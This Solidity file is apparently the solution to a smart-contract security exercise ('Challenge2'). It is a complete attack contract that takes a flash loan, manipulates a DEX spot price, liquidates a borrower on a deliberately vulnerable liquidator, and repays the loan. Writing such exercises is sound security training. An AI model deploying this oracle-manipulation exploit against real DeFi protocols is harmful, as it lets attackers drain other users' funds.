// SPDX-License-Identifier: MIT
pragma solidity ^0.8.33;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

// interface of contract FlahLoanPool.sol
interface IFlashLoanPool {
    function flashLoan(address token, uint256 amount, bytes calldata data) external;
}

// interface of contract SimpleDEX.sol
interface ISimpleDEX {
    function swap(address tokenIn, uint256 amountIn) external;
}

// interface of contract VulnerableLiquidator.sol
interface IVulnerableLiquidator {
    function getPrice() external returns (uint256);
    function openPosition(uint256 collateralAmount, uint256 borrowAmount) external;
    function isHealthy(address user) external returns (bool);
    function liquidate(address borrower) external;
}

contract Challenge2 {
    using SafeERC20 for IERC20;

    IFlashLoanPool public pool;
    ISimpleDEX public dex;
    IVulnerableLiquidator public liquidator;
    IERC20 public tokenA;
    IERC20 public tokenB;

    address borrower;
    uint256 debt;

    constructor(
        address _pool,
        address _dex,
        address _liquidator,
        address _tokenA,
        address _tokenB,
        address _borrower,
        uint256 _debt
    ) {
        pool = IFlashLoanPool(_pool);
        dex = ISimpleDEX(_dex);
        liquidator = IVulnerableLiquidator(_liquidator);
        tokenA = IERC20(_tokenA);
        tokenB = IERC20(_tokenB);
        borrower = _borrower;
        debt = _debt;
    }

    // 1. start the attack
    function attack(uint256 amount) external {
        pool.flashLoan(address(tokenA), amount, "");
    }

    // 2. The callback function the pool calls during flashLoan
    function onFlashLoan(address token, uint256 amount, bytes calldata data) external {
        // Step A: Swap the borrowed TokenA for TokenB on the DEX 
        // (This makes TokenA price go DOWN)
        IERC20(token).approve(address(dex), amount);
        dex.swap(token, amount);

        // Step B: trigger liquidate if the position is unhealthy (collateral value < debt)
        if (!liquidator.isHealthy(borrower)) {
            tokenB.approve(address(liquidator), debt);
            liquidator.liquidate(borrower);
        }
        
        // Step C: Swap the rest of TokenB for TokenA on the DEX
        uint256 restAmountB = tokenB.balanceOf(address(this));
        tokenB.approve(address(dex), restAmountB);
        dex.swap(address(tokenB), restAmountB);

        // Step D: Repay the Flash Loan (transfer 'amount' of tokenA back to 'msg.sender')
        IERC20(token).safeTransfer(msg.sender, amount);
    }
}